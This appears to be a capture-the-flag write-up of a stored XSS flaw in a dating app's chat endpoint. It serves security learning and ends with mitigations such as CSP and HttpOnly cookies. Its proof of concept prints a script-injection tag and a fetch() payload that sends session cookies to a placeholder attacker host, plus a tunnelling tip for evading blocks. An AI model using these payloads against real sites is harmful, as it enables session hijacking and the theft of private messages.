+++
date = '2025-02-17T15:41:14+01:00'
draft = false
title = 'OnlyHacks'
+++

## Overview

A cross-site scripting (XSS) vulnerability was discovered in a dating web application (similar to Tinder) where users chat after matching. The flaw is located in the chat endpoint, which fails to properly sanitize inputs. This allowed the injection of an external JavaScript file to steal session cookies, read user chats, and even retrieve a sensitive flag from direct messages (DMs).

## Vulnerability Description

The vulnerability occurs when an attacker injects a malicious payload. Once executed in the victim's browser, the payload sends the user's session cookie to an attacker-controlled server. With the stolen cookie, the attacker can hijack the session, access private chats, and extract sensitive data.

## Proof of Concept (PoC)

### 1. External Script Injection
Inject the following code into the vulnerable endpoint:

```html
<script src="http://your_public_url:43451/test.js"></script>
```

### 2. Cookie Exfiltration Payload
The external JavaScript file (`test.js`) contains the following payload:

```javascript
fetch('http://your_public_url:43451/log?cookie=' + document.cookie);
```
**Tip**: If the tester is using Ngrok or Pinggy, they should use a TCP tunnel instead of an HTTP tunnel to avoid potential security mechanisms blocking requests.

## POC


![PoC Screenshot 1](/static/XSS_enum.png)
![PoC Screenshot 2](/static/cookie.png)
![PoC Screenshot 3](/static/flag.png)


## Impact

- **Session Hijacking:** The attack successfully stole a user’s session cookie.
- **Unauthorized Data Access:** The stolen cookie allowed access to the victim’s chat messages.
- **Sensitive Information Disclosure:** A flag was retrieved from the victim's direct messages (DMs).

These impacts highlight the risk of unauthorized access and potential data breaches resulting from XSS vulnerabilities.

## Recommendations

To mitigate this vulnerability, consider the following steps:

1. **Input Sanitization:** Ensure that all user inputs are properly sanitized to prevent script injection.
2. **Content Security Policy (CSP):** Implement a strict CSP to restrict the execution of untrusted scripts.
3. **Cookie Security:** Use HttpOnly and Secure flags on cookies to prevent JavaScript access.
4. **Regular Security Audits:** Conduct periodic security testing and code reviews to identify and fix vulnerabilities.

## Conclusion

This XSS vulnerability underscores the importance of robust input validation and secure coding practices. Implementing the recommended measures can significantly reduce the risk of similar attacks and protect user data.

